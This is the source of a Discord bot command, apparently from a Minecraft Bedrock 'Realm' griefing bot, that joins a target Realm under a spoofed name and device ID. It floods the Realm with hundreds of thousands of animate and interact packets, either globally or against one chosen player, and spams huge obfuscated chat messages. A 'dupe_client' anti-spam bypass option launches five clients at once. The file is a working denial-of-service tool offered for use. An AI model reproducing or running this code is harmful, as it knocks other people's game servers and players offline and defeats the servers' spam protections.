const { SlashCommandBuilder, EmbedBuilder } = require("discord.js");
const config = require('../../data/discord/config.json');
const fs = require('node:fs').promises;
const colors = require('../../data/handles/colors.js');
const path = require('path');
const { createClient } = require('bedrock-protocol');
const { dumprealm, checkaccount, getrealminfo } = require('../../men/realms');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { Authflow, Titles } = require("prismarine-auth");
const skinData = require('../../data/skins/jenny.json');
const { reply1, reply2 } = require('../../data/discord/emojies.js');

// Helper: check if a file or folder exists asynchronously
async function fileExists(filePath) {
  try {
    await fs.access(filePath);
    return true;
  } catch {
    return false;
  }
}

module.exports = {
  data: new SlashCommandBuilder()
    .setName("particle")
    .setIntegrationTypes(0, 1)
    .setContexts(0, 1, 2)
    .setDescription("Lag the Realm with different modes")
    .addStringOption(option =>
      option.setName('invite')
        .setDescription('Realm invite code or Realm ID')
        .setRequired(true)
        .setMinLength(8)
        .setMaxLength(15))
    .addIntegerOption(option =>
      option.setName('duration')
        .setDescription('Duration in seconds to send lag packets')
        .setRequired(true)
        .setMinValue(1)
        .setMaxValue(1000))
    .addBooleanOption(option =>
      option.setName('dupe_client')
        .setDescription('Anti-spam bypass option')
        .setRequired(true))
    .addIntegerOption(option =>
      option.setName('mode')
        .setDescription('Choose the lag mode')
        .setRequired(true)
        .addChoices(
          { name: 'Type 1', value: 1 },
          { name: 'Type 1 (Global)', value: 2 },
          { name: 'Type 2 (Global)', value: 3 },
          { name: 'Type 3 (Global)', value: 4 }
        ))
    .addStringOption(option =>
      option.setName('namespoof')
        .setDescription('Clients Name')
        .setRequired(false)
        .setMinLength(8)
        .setMaxLength(50)),
  async execute(interaction) {
    const invite = interaction.options.getString('invite');
    const namespoof = interaction.options.getString('namespoof') || "";
    const mode = interaction.options.getInteger('mode');
    const dupe_client = interaction.options.getBoolean('dupe_client') || false;
    const duration = interaction.options.getInteger('duration');
    let disconnected = false;

    // Icon constants for embed statuses
    const off = "⚫";
    const waiting = "🟡";
    const done = "🟢";
    const err1 = "🔴";

    const main = new EmbedBuilder()
      .setTitle("Client Lag")
      .setDescription("Loading data, this may take a few seconds depending on the workload.")
      .setFields(
        { name: 'Connected', value: off, inline: false },
        { name: 'Lagging', value: off, inline: false },
        { name: 'Disconnected', value: off, inline: false },
        { name: 'Disconnected Reason', value: waiting, inline: false }
      )
      .setColor(config.embeds.color);

    try {
      await interaction.reply({ embeds: [main] });

      // Load the user database asynchronously
      const databasePath = './data/user/users.json';
      let database;
      try {
        const dbData = await fs.readFile(databasePath, 'utf8');
        database = JSON.parse(dbData);
      } catch (error) {
        return interaction.editReply({
          content: 'Failed to load the database.',
          ephemeral: true,
        });
      }

      // Check if the user's profile folder exists
      const profileFolderPath = `./data/user/profilefolders/${interaction.user.id}`;
      if (!(await fileExists(profileFolderPath))) {
        return interaction.editReply({
          embeds: [
            new EmbedBuilder()
              .setTitle('Account Not Linked')
              .setDescription("It seems like you haven't linked an account yet.\nPlease link an account with '/link' to use this command.")
              .setColor(0xff0000)
          ]
        });
      }

      // Load whitelist and check if the invite is blocked
      let whitelist = [];
      try {
        const whitelistPath = './data/util/whitelist.json';
        const wlData = await fs.readFile(whitelistPath, 'utf8');
        whitelist = JSON.parse(wlData);
      } catch {
        // If loading fails, assume an empty whitelist.
      }
      if (whitelist.includes(invite)) {
        return interaction.editReply({
          embeds: [
            new EmbedBuilder()
              .setTitle('Realm Error')
              .setDescription(`The invite ${invite} is in the whitelist and cannot be lagged.`)
              .setColor(config.embeds.color)
          ]
        });
      }

      // Get realm information
      const realm = await getrealminfo(invite);
      if (!realm) {
        console.error(`[${new Date().toLocaleTimeString()}] Error: Realm not found`);
        return interaction.editReply({
          embeds: [
            new EmbedBuilder()
              .setTitle('Realm Error')
              .setDescription('Invalid code: realm not found or account banned.')
              .setColor(config.embeds.color)
          ]
        });
      }

      // Create client instance(s)
      if (dupe_client) {
        for (let i = 1; i <= 5; i++) {
          createClientInstance(interaction, invite, mode, namespoof, duration, profileFolderPath, realm, main, { off, waiting, done, err1 });
        }
      } else {
        createClientInstance(interaction, invite, mode, namespoof, duration, profileFolderPath, realm, main, { off, waiting, done, err1 });
      }
    } catch (err) {
      console.error(err);
      interaction.editReply({ content: 'An error occurred during command execution.', ephemeral: true });
    }
  }
};

function createClientInstance(interaction, invite, mode, namespoof, duration, profileFolderPath, realm, main, icons) {
  const { off, waiting, done, err1 } = icons;
  const client = createClient({
    profilesFolder: profileFolderPath,
    username: interaction.user.id,
    offline: false,
    realms: invite.length === 8 ? { realmId: invite } : { realmInvite: invite },
    skinData: {
      DeviceOS: 7, // Windows 10 (x64); adjust as needed
      DeviceId: getDeviceId(7),
      PlatformOnlineId: genrandomstring(19, '1234567890'),
      PrimaryUser: false,
      SelfSignedId: uuidv4(),
      ThirdPartyName: namespoof,
      ThirdPartyNameOnly: true,
      TrustedSkin: true,
      ...skinData
    },
    skipPing: true
  });

  client.on('server_stats', async (err) => {
    console.error(`[${new Date().toLocaleTimeString()}] Buggy Packet Received: ${err.message || err}`);
  });

  client.on('error', async (err) => {
    console.error(`[${new Date().toLocaleTimeString()}] Client error: ${err.message || err}`);
    main.setDescription("Wops! There was an error while trying to join the Realm");
    main.setFields(
      { name: 'Connected', value: off, inline: false },
      { name: 'Lagging', value: err1, inline: false },
      { name: 'Disconnected', value: err1, inline: false },
      { name: 'Disconnected Reason', value: `${err}`, inline: false }
    );
    interaction.editReply({ embeds: [main] });
  });

  // For modes targeting specific players, track added players
  const playerEntities = new Map();
  let targetPlayerUUID = null;
  client.on('add_player', (packet) => {
    playerEntities.set(packet.uuid, packet.runtime_id);
    console.log(`[INFO] Player added: ${packet.username} | Runtime ID: ${packet.runtime_id}`);
    if (mode === 3 && targetPlayerUUID === null) {
      targetPlayerUUID = packet.uuid;
    }
  });
  client.on('remove_entity', (packet) => {
    for (let [uuid, entityId] of playerEntities) {
      if (entityId === packet.entity_id) {
        console.log(`[INFO] Player removed: ${uuid}`);
        playerEntities.delete(uuid);
        break;
      }
    }
  });

  client.on('start_game', async (packet) => {
    console.log(`[Realm Watcher]>> User ${interaction.user.username}/${interaction.user.id} joined Realm ${realm.name}/${invite}`);
    try {
      main.setDescription(`${reply1}Realm Name: ${realm.name}\n${reply1}Realm ID: ${realm.id}\n${reply2}Realm IP: ${realm.ip}`);
      main.setFields(
        { name: 'Connected', value: done, inline: false },
        { name: 'Lagging', value: waiting, inline: false },
        { name: 'Disconnected', value: waiting, inline: false },
        { name: 'Disconnected Reason', value: waiting, inline: false }
      );
      interaction.editReply({ embeds: [main] });

      setTimeout(() => {
        main.setFields(
          { name: 'Connected', value: done, inline: false },
          { name: 'Lagging', value: done, inline: false },
          { name: 'Disconnected', value: waiting, inline: false },
          { name: 'Disconnected Reason', value: waiting, inline: false }
        );
        interaction.editReply({ embeds: [main] });
        // Execute mode-specific lag logic
        switch (mode) {
          case 1: // Bot Lag mode: spam packets on the bot itself
            console.log(`[INFO] Spamming 500K packets on the bot itself.`);
            for (let i = 0; i < 500000; i++) {
              client.queue("animate", {
                action_id: 4,
                runtime_entity_id: packet.runtime_id
              });
            }
            break;
          case 2: // Global mode: spam all players
            console.log(`[INFO] Spamming 500K packets on all players.`);
            for (let [uuid, entityId] of playerEntities) {
              console.log(`[INFO] Attacking entity ID: ${entityId}`);
              setTimeout(() => {
                for (let i = 0; i < 500000; i++) {
                  client.queue("animate", {
                    action_id: 4,
                    runtime_entity_id: entityId
                  });
                  client.queue('interact', {
                    action_id: "mouse_over_entity",
                    target_entity_id: entityId,
                    position: { x: 0, y: 0, z: 0 }
                  });
                }
                console.log(`[INFO] Finished 500K packets for entity ID: ${entityId}`);
              }, 0);
            }
            break;
          case 3: // Single Player mode: target first found player
            if (targetPlayerUUID) {
              console.log(`[INFO] Spamming packets on target player: ${targetPlayerUUID}`);
              for (let i = 0; i < 1000000; i++) {
                client.queue("animate", {
                  action_id: 4,
                  runtime_entity_id: playerEntities.get(targetPlayerUUID)
                });
              }
            }
            break;
          case 4: // Mode 4: not implemented
            console.log(`[INFO] Mode 4 not implemented.`);
            break;
        }
      }, 7000);

      client.on("spawn", (packet) => {
        if (mode === 3) {
          setInterval(() => {
            for (let i = 0; i < 5; i++) {
              client.queue("text", {
                filtered_message: "",
                type: "chat",
                needs_translation: false,
                source_name: client.profile.name,
                message: "§4§l§kTSAR\n".repeat(80000),
                xuid: "0",
                platform_chat_id: "0"
              });
            }
          }, 1600);
        }
      });

      setTimeout(() => {
        if (!disconnected) {
          client.close();
          main.setFields(
            { name: 'Connected', value: done, inline: false },
            { name: 'Lagging', value: done, inline: false },
            { name: 'Disconnected', value: done, inline: false },
            { name: 'Disconnected Reason', value: waiting, inline: false }
          );
          interaction.editReply({ embeds: [main] });
          disconnected = true;
        }
      }, duration * 1000 + 1000);
    } catch (error) {
      console.error(error);
      throw error;
    }
  });

  const errorMessages = {
    "disconnectionScreen.noReason": "You have been disconnected from the Realm because of sending too many packets",
    "disconnection.kicked.reason": "You have been Kicked From the Realm",
    "disconnection.kicked": "You have been Kicked From the Realm",
    "disconnectionScreen.outdatedClient": "The Realm is outdated!",
    "disconnectionScreen.disconnected": "Disconnected from the Realm",
    "disconnectionScreen.serverFull": "Realm is Currently Full",
    "disconnectionScreen.notAllowed": "Something didn't go right, try to use a less longer NameSpoof Name. (notAllowed)",
    "disconnectionScreen.serverIdConflict": "Client already in this Realm. Leave with the Account or wait until your Interaction is done",
    "disconnectionScreen.loggedinOtherLocation": "Client already in this Realm. Leave with the Account or wait until your Interaction is done",
    "disconnectionScreen.worldCorruption": "The world on this realm is corrupted, Unable to Join",
    "disconnect.scriptWatchdog": "The realm was shut down due to an unhandled scripting watchdog exception.",
    "disconnect.scriptWatchdogOutOfMemory": "The realm was shut down because of scripting memory limit."
  };

  function parseKickMessage(msg) {
    for (const key in errorMessages) {
      msg = msg.replace(key, errorMessages[key]);
    }
    return msg;
  }

  client.on('kick', async (reason) => {
    console.log(`[${new Date().toLocaleTimeString()}] Client Kicked from the Realm. ${realm.id}/${realm.name}. ${parseKickMessage(reason.message)}`);
    main.setFields(
      { name: 'Connected', value: off, inline: false },
      { name: 'Lagging', value: err1, inline: false },
      { name: 'Disconnected', value: err1, inline: false },
      { name: 'Disconnected Reason', value: parseKickMessage(reason.message), inline: false }
    );
    interaction.editReply({ embeds: [main] });
  });

  client.on('close', async (err) => {
    if (!err) return;
    if (disconnected) return;
    disconnected = true;
    console.log(`[${new Date().toLocaleTimeString()}] Client closed Connection from the Realm. ${realm.id}/${realm.name}.`);
    main.setFields(
      { name: 'Connected', value: off, inline: false },
      { name: 'Lagging', value: err1, inline: false },
      { name: 'Disconnected', value: err1, inline: false },
      { name: 'Disconnected Reason', value: parseKickMessage(err.message || "N/A"), inline: false }
    );
    interaction.editReply({ embeds: [main] });
  });
}

function genrandomstring(length, charSet) {
  if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += charSet.charAt(Math.floor(Math.random() * charSet.length));
  }
  return result;
}

function getDeviceId(deviceOS) {
  const getUUIDv3 = () => uuidv3(uuidv4(), NIL);
  const getUUIDv5 = () => uuidv5(uuidv4(), NIL);
  switch (deviceOS) {
    case 1:
      return uuidv4().replace(/-/g, "");
    case 2:
      return uuidv4().replace(/-/g, "").toUpperCase();
    case 7:
      return getUUIDv3();
    case 8:
      return getUUIDv3();
    case 11:
      return getUUIDv3();
    case 12:
      return getUUIDv5();
    case 13:
      return genrandomstring(44, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890/=+");
    default:
      return uuidv4();
  }
}